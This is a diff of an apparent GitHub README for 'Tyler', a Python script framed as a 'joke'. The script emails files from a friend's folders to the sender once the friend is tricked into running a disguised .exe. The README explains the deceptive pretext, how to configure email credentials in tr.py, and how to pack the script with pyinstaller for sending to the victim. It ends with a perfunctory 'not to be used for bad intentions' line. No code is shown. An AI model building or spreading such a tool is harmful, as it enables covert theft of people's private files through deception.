@@ -1,8 +1,10 @@
 # Tyler
 
-📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from the your friend "Downloads" folder to your email (if you are interested in another folder, you can change it in the code). The project is easy to run from the command line and can be packed using `pyinstaller`.
+📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from some your friend's folders to your email (if you are interested in another folder, you can change it in the code). The project is easy to run from the command line and can be packed using `pyinstaller`.
 
 ## 📦 Installation
+
+It will not work on Linux or MacOS
 
 Make sure you have Python 3.7+ installed and `pip`.
 
@@ -13,7 +15,7 @@ cd Tyler
 \`\`\`
 ## 🚀 Setup
 
-To launch the main script, you must go to the file "setup.py" and fill in all the information there. There is nothing complicated there, except for the line email_password
+To launch the main script, you must go to the file "tr.py" and fill in all the information there(it's at the comment "const"). There is nothing complicated there, except for the line email_password
 
 # How can you get it in Gmail
 
@@ -65,4 +67,4 @@ pyinstaller -F tr.py
 
 After that, the .exe will appear in the dist/ folder, which you can send to your friend:)
 
-## P.S.: not to be used for bad intentions!!!
+## P.S.: not to be used for bad intentions!!! Also, at first, you should test it on yourself to check if it works
